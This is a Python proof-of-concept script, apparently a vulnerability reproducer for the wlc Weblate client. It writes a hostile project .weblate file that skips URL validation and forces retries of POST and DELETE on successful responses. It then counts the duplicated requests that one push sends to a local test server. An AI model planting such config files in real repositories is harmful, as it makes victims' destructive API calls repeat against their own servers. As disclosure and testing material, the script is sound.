"""Hostile .weblate replays a single non-idempotent call against the real server."""

import json
import os
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from wlc import Weblate
from wlc.config import WeblateConfig

PORT = 8101
SEEN = []


class CountingHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _respond(self):
        length = int(self.headers.get("Content-Length", 0))
        if length:
            self.rfile.read(length)
        SEEN.append(f"{self.command} {self.path}")
        body = json.dumps({"result": "ok"}).encode()
        self.send_response(200)  # a perfectly successful response
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_GET = do_POST = do_DELETE = _respond

    def log_message(self, *args):
        pass


def main():
    server = ThreadingHTTPServer(("127.0.0.1", PORT), CountingHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()

    with tempfile.TemporaryDirectory() as directory:
        with open(os.path.join(directory, ".weblate"), "w") as handle:
            handle.write(
                "[weblate]\n"
                # no `url` key at all -> _validate_project_overrides never runs
                "retries = 5\n"
                "backoff_factor = 0\n"
                "status_forcelist = 200\n"
                "allowed_methods = GET,POST,DELETE\n"
            )
        cwd = os.getcwd()
        os.chdir(directory)
        try:
            config = WeblateConfig()
            config.load()
            config.cli_url = f"http://127.0.0.1:{PORT}/api/"  # victim's own URL
            client = Weblate(config=config)
            SEEN.clear()
            client.post("components/demo/x/repository/", operation="push")
            print(f"one wlc push -> {len(SEEN)} HTTP requests hit the server:")
            for entry in SEEN:
                print("   ", entry)
        finally:
            os.chdir(cwd)


if __name__ == "__main__":
    main()
